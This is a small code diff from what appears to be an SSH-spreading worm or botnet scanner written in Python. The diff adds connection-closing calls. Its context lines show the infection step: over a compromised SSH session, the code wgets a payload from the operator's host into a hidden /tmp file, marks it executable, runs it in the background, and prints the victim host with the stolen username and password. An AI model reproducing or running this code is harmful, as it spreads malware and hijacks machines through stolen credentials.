@@ -41,8 +41,7 @@ class Scanner(Thread):
                     ssh.exec_command("wget http://" + self.host + "/" + self.file + " -O /tmp/." + self.file + "; chmod +x /tmp/." + self.file + "; /tmp/." + self.file + " &")
                     print("\033[92m Infected %s | %s:%s" % (host, self.creds.split(":")[0], self.creds.split(":")[1]) + "\033[0m")
 
-                else:
-                    pass
+                ssh.close()
 
             except Exception:
-                pass
+                ssh.close()
